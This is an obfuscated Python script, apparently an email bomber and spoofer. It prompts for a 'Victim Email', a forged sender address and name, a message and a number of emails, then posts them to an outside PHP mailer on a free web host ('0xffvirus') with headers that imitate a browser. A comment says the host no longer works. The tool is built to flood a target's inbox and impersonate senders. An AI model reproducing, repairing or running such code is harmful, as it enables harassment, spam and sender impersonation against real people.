#Web host is not working!
def JIJJJJJIIIIJJJIIJJIIJIIJJIIIJIJJIIIJJJIJIJJIIJJIIIIJIIII():
    import requests
    from termcolor import colored
    JIJJJJJIIIIJJJIIJJIIJIIJIIIIIJIIIIIIJJIIII = 5
    JIJJJJJIIIIJJJIIJJIIJIIJJIIIIJJIJJIIIIJJIIII = "https://0xffvirus.000webhostapp.com/mail.php" 
    print(colored("WEB HOST IS NOT WORKING!", "red"))
    JIJJJJJIIIIJJJIIJJIIJIIIIIJJIIJIIJIIIIIIJJIIII = input(colored("Victim Email: ", 'green')) 
    JIJIJIIIJIJJIIJJJIIJJIIJIIJJIJIIJIJJIIIJJJIJIJ = input(colored("Email From: ", 'green')) 
    JIJIJIIIJIJJIIJJJIIJJIIJIIJJIJIIJIIIIIIIJIIIJIIIJ = input(colored("Sender Name: ", 'green')) 
    JIJIJIIIJIJJIIJJJIIJJIIJIIJJIJIIJIIIIJIIJJJIIJ = input(colored("Subject: ", 'green')) 
    print(colored("Message: [ 5 lines ]", 'green')) 
    JIJIJIIIJIJJIIJJJIIIIIIIIJIJIJIIJIIIIJIIJJJIIJ = ""
    for i in range(JIJJJJJIIIIJJJIIJJIIJIIJIIIIIJIIIIIIJJIIII):
        JIJIJIIIJIJJIIJJJIIIIIIIIJIJIJIIJIIIIJIIJJJIIJ += input() + "\n"

    JIJIJIIIIJIIIIJJIIJJJIJIJIIJIJIIIIJIIJJJIIJ = int(input(colored("Number of emails: ", 'green'))) 
    headers = { 
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "content-length": "121",
        "content-type": "application/x-www-form-urlencoded",
        "origin":"https://0xffvirus.000webhostapp.com",
        "referer":"https://0xffvirus.000webhostapp.com/main.html",
        "sec-fetch-dest":"document",
        "sec-fetch-mode":"navigate",
        "sec-fetch-site":"same-origin",
        "sec-fetch-user":"?1",
        "sec-gpc":"1",
        "upgrade-insecure-requests":"1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
    }
    data = { 
        "mail_to": JIJJJJJIIIIJJJIIJJIIJIIIIIJJIIJIIJIIIIIIJJIIII,
        "mail_from": JIJIJIIIJIJJIIJJJIIJJIIJIIJJIJIIJIJJIIIJJJIJIJ,
        "subject": JIJIJIIIJIJJIIJJJIIJJIIJIIJJIJIIJIIIIJIIJJJIIJ,
        "message": JIJIJIIIJIJJIIJJJIIIIIIIIJIJIJIIJIIIIJIIJJJIIJ,
        "count": JIJIJIIIIJIIIIJJIIJJJIJIJIIJIJIIIIJIIJJJIIJ,
        "submit":"Submit",
        "name": JIJIJIIIJIJJIIJJJIIJJIIJIIJJIJIIJIIIIIIIJIIIJIIIJ,
    }
    requests.post(JIJJJJJIIIIJJJIIJJIIJIIJJIIIIJJIJJIIIIJJIIII, headers=headers, data=data) 
    print(colored(f"[ Email Sent Successfully | {JIJIJIIIJIJJIIJJJIIJJIIJIIJJIJIIJIJJIIIJJJIJIJ} --> {JIJJJJJIIIIJJJIIJJIIJIIIIIJJIIJIIJIIIIIIJJIIII} N:{JIJIJIIIIJIIIIJJIIJJJIJIJIIJIJIIIIJIIJJJIIJ}]", 'yellow'))
    input(colored("Press Enter to exit ...", 'red'))
